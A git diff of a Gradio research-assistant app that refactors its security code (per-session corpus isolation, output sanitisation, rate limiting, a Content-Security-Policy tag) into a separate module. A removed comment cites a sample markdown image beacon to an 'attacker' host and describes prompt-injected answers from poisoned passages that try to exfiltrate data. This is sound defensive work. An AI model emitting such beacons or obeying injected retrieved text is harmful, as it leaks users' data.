@@ -10,24 +10,17 @@ not look like a stock Gradio demo.
 """
 from __future__ import annotations
 
-import html
 import os
 import pathlib
-import re
 import sys
-import threading
-import time
-from collections import defaultdict
 
 sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent / "src"))
 
 import gradio as gr
-import numpy as np
 import spaces
 
 from scholar_rag.config import get_settings
 from scholar_rag.ingestion import chunks_from_text, ingest_paths, seed_corpus_if_empty
-from scholar_rag.schemas import RetrievedContext
 from scholar_rag.vector_store import get_vector_store
 
 settings = get_settings()
@@ -35,62 +28,28 @@ settings = get_settings()
 # Seed the corpus once at startup so a fresh Space isn't empty.
 seed_corpus_if_empty(store=get_vector_store())
 
-# --- Per-session corpus isolation (SECURITY) ---------------------------------
-# The seeded corpus is treated as READ-ONLY and shared. Anything a visitor uploads
-# or fetches from arXiv must NOT leak into other visitors' results, so user
-# documents live in an in-memory per-session store (held in gr.State) that is
-# searched *alongside* the seed corpus only for that session. This closes the
-# unauthenticated shared-corpus poisoning / cross-user contamination hole.
-SEED_STORE = get_vector_store()  # shared, read-only base corpus
+# --- Per-session corpus isolation + output safety (SECURITY) -----------------
+# The seeded corpus is READ-ONLY and shared; visitor uploads/arXiv go to an
+# in-memory per-session store searched only for that session (closes the shared-
+# corpus poisoning hole). Sanitisation + rate limiting live in scholar_rag.websafe
+# so the security logic is unit-testable without importing this Gradio module.
+from scholar_rag.websafe import (  # noqa: E402
+    CSP_META,
+    MAX_UPLOAD_BYTES,
+    MAX_UPLOAD_FILES,
+    CombinedStore as _CombinedStore,
+    MemStore as _MemStore,
+    RateLimiter,
+    safe_inline as _safe_inline,
+    safe_md as _safe_md,
+)
 
-MAX_SESSION_CHUNKS = 400          # cap a session's private corpus (abuse/DoS)
-MAX_UPLOAD_FILES = 5
-MAX_UPLOAD_BYTES = 12 * 1024 * 1024  # 12 MB per file
-
-
-class _MemStore:
-    """Ephemeral, per-session vector store (no disk; dropped with the session)."""
-
-    def __init__(self):
-        self.embeddings = None
-        self.chunks: list = []
-
-    def add(self, chunks, embeddings):
-        room = MAX_SESSION_CHUNKS - self.count()
-        if room <= 0:
-            return
-        chunks = list(chunks)[:room]
-        emb = np.asarray(embeddings, dtype="float32")[:room]
-        self.embeddings = emb if self.embeddings is None else np.vstack([self.embeddings, emb])
-        self.chunks.extend(chunks)
-
-    def query(self, query_embedding, k: int = 5):
-        if self.embeddings is None or not self.chunks:
-            return []
-        q = np.asarray(query_embedding, dtype="float32").reshape(-1)
-        sims = self.embeddings @ q
-        top = np.argsort(-sims)[:k]
-        return [RetrievedContext(chunk=self.chunks[i], score=float(sims[i])) for i in top]
-
-    def count(self) -> int:
-        return len(self.chunks)
+SEED_STORE = get_vector_store()   # shared, read-only base corpus
+_limiter = RateLimiter()
 
 
-class _CombinedStore:
-    """Read-only view over the shared seed store + one session's private store."""
-
-    def __init__(self, *stores):
-        self.stores = [s for s in stores if s is not None]
-
-    def query(self, query_embedding, k: int = 5):
-        hits: list = []
-        for s in self.stores:
-            hits.extend(s.query(query_embedding, k=k))
-        hits.sort(key=lambda rc: rc.score, reverse=True)
-        return hits[:k]
-
-    def count(self) -> int:
-        return sum(s.count() for s in self.stores)
+def _rate_ok(request) -> bool:
+    return _limiter.allow(RateLimiter.client_id(request))
 
 
 def _retriever(session_store):
@@ -118,53 +77,6 @@ def _run_agent(question, session_store):
 
     return Agent(registry=ToolRegistry(retriever=_retriever(session_store)),
                  settings=settings).run(question)
-
-
-# --- Output sanitisation (defence-in-depth vs. injected markup) ---------------
-# Answers + retrieved snippets are UNTRUSTED (LLM output shaped by retrieved
-# documents), yet render in Markdown/HTML components. Neutralise raw HTML and drop
-# image/link markup so an injected `![](http://attacker/?data=…)` beacon or an
-# `<img>`/`<script>` tag from a poisoned passage cannot render or phone home.
-_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
-_MD_LINK = re.compile(r"\[([^\]]+)\]\(\s*(?:[a-z][a-z0-9+.\-]*:)?//[^)]*\)", re.I)
-
-
-def _safe_md(text: str) -> str:
-    if not text:
-        return text or ""
-    text = _MD_IMAGE.sub(r"\1", text)                       # images -> alt text
-    text = _MD_LINK.sub(r"\1", text)                        # external links -> text
-    return text.replace("<", "&lt;").replace(">", "&gt;")  # no raw HTML tags
-
-
-def _safe_inline(text) -> str:
-    """Escape a short display string (filename/source) shown inside markdown/HTML."""
-    return html.escape(str(text or ""), quote=False).replace("`", "'")
-
-
-# --- Best-effort rate limiting (denial-of-wallet / abuse) --------------------
-_RL_LOCK = threading.Lock()
-_RL_HITS: dict = defaultdict(list)
-_RL_MAX = 25          # requests ...
-_RL_WINDOW = 300.0    # ... per 5 minutes, per client
-
-
-def _rate_ok(request) -> bool:
-    cid = "anonymous"
-    try:
-        fwd = request.headers.get("x-forwarded-for") if request else None
-        cid = (fwd.split(",")[0].strip() if fwd
-               else (request.client.host if request and request.client else "anonymous"))
-    except Exception:
-        pass
-    now = time.time()
-    with _RL_LOCK:
-        hits = [t for t in _RL_HITS[cid] if now - t < _RL_WINDOW]
-        _RL_HITS[cid] = hits
-        if len(hits) >= _RL_MAX:
-            return False
-        hits.append(now)
-        return True
 
 
 # --- small inline icons (Lucide-style; no emoji-as-icons) --------------------
@@ -638,10 +550,7 @@ footer{display:none!important;}
 # prompt-injected answer might try to render (exfiltration / tracking). Only img/
 # object/base are constrained, so Gradio's own scripts, fonts and styles are
 # untouched; the HF iframe embed (frame-ancestors) is deliberately left alone.
-CSP_HEAD = (
-    '<meta http-equiv="Content-Security-Policy" '
-    "content=\"img-src 'self' data: blob:; object-src 'none'; base-uri 'self'\">"
-)
+CSP_HEAD = CSP_META  # single source of truth in scholar_rag.websafe
 
 # Force the dark palette regardless of the viewer's system theme, so the design
 # renders as intended for everyone (standard HF Spaces technique).
